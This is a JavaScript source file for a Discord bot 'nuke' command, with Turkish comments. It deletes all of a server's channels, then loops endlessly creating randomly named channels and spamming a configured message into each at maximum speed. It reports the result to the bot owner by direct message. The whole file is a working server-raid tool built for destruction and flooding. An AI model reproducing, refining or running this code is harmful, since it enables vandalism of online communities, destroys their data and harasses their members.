const config = require("../config.json");

module.exports = {
  name: "nuke",
  description: "tüm kanalları silip Mesaj spamlar",
  async execute(message, args, client) {
    if (!message.guild) {
      return message.reply("Komut sadece sunucu içerisinde kullanılabilir");
    }

    const hedefSunucu = message.guild;

    try {
      await message.react("💥");

      const kanallar = hedefSunucu.channels.cache;
      let silinenSayisi = 0;
      let atlanSayisi = 0;

      console.log(
        `💥 ${hedefSunucu.name}  Sunucu kanalları yemeye başladım...`
      );
      for (const [id, kanal] of kanallar) {
        try {
          await kanal.delete();
          silinenSayisi++;
          console.log(`🗑️ Kanal silindi: ${kanal.name}`);
        } catch (error) {
          atlanSayisi++;
          console.log(`⚠️ Kanal silinemedi: ${kanal.name}`);
        }
      }

      console.log(`Kanal oluşturma işlemini başlatıyorum`);
      const harfler = "abcdefghijklmnopqrstuvwxyz"; // burada belirlediğimiz harflerden kanallar açıyor Her kanal listedeki harften açılır
      let olusturulanKanalSayisi = 0;
      const maksimumHizSpam = async (kanal) => {
        const spamLoop = () => {
          kanal.send(config.nukeMessage).catch(() => {});
          setImmediate(spamLoop);
        };
        spamLoop();
      };
      const maksimumHizKanalOlustur = () => {
        const kanalLoop = () => {
          const rastgeleHarf =
            harfler[Math.floor(Math.random() * harfler.length)];

          hedefSunucu.channels
            .create({
              name: rastgeleHarf,
              type: 0,
            })
            .then((kanal) => {
              olusturulanKanalSayisi++;
              console.log(
                `📝 Kanal oluşturuldu: ${rastgeleHarf} (Toplam: ${olusturulanKanalSayisi})`
              );
              maksimumHizSpam(kanal);
            })
            .catch(() => {
              console.log(`⚠️ Kanal oluşturulamadı, devam ediyorum`);
            });
          setImmediate(kanalLoop);
        };
        kanalLoop();
      };
      maksimumHizKanalOlustur();

      const cevap = ` Nuke tamamlandı!\n Silinen: ${silinenSayisi}\n⚠️ Atlanan: ${atlanSayisi}\n🔥 zypheriss`;

      // Kanalları silmeyi tamamladığı için config.json daki sahip id' deki kişiye dm den Mesaj atıcak
      const sahip = await client.users.fetch(config.ownerId);
      sahip.send(`${cevap}\nSunucu: ${hedefSunucu.name}`);
    } catch (error) {
      console.error(" Nuke komutunda hata:", error);
      message.reply(" Nuke komutu çalıştırılırken bir hata oluştu.");
    }
  },
};
